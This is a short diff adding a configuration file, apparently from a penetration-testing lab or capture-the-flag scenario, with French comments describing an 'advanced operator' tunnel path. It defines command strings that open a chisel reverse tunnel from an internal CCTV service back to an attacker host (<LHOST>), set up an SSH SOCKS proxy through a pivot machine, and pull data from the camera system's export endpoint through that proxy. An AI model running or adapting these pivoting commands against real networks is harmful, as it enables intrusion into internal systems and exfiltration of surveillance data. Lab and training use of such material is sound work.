@@ -1,0 +1,6 @@
+# Tunnel / reverse (voie opérateur avancée)
+# Lab: remplacer <LHOST> par host.docker.internal (Docker Desktop) ou IP LAN du poste attaquant
+
+chisel_optional=/opt/omega/ops/bin/chisel client <LHOST>:<PORT> R:0.0.0.0:18082:cctv:8080
+ssh_socks=ssh -i id_ops -D 1080 -N ops@pivot -p ${PIVOT_SSH_PORT}
+curl_via_socks=curl -x socks5h://127.0.0.1:1080 "http://cctv:8080/api/export.php?id=int-cam3-offline&scope=legacy&as=ops"
